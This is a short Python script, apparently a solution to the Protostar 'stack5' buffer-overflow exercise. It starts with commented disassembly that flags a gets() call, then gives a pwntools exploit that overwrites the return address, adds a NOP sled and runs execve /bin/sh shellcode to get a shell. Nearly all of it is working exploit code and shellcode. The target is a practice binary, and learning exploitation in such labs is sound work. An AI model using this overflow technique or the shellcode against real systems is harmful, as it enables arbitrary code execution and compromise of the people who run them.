#   0x080483c4 <+0>:	push   ebp
#   0x080483c5 <+1>:	mov    ebp,esp
#   0x080483c7 <+3>:	and    esp,0xfffffff0
#   0x080483ca <+6>:	sub    esp,0x50
#   0x080483cd <+9>:	lea    eax,[esp+0x10]
#   0x080483d1 <+13>:	mov    DWORD PTR [esp],eax
#   0x080483d4 <+16>:	call   0x80482e8 <gets@plt> #vuln
#   0x080483d9 <+21>:	leave  
#   0x080483da <+22>:	ret  
# This time the goal is to jump to our own shellcode
# r < <(python2 -c 'print("A"*76 + "\xbc\xcb\xff\xff" + "\x90" * 100 + "\xcc" * 4)'

from pwn import * 

p = process('./stack5')

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

buf = b'A' * 76
nops = b'\x90' * 200
ret = p32(0xffffde14)
int3 = b"\xcc" * 4

payload = buf + ret + nops + shellcode

p.sendline(payload)

p.interactive()
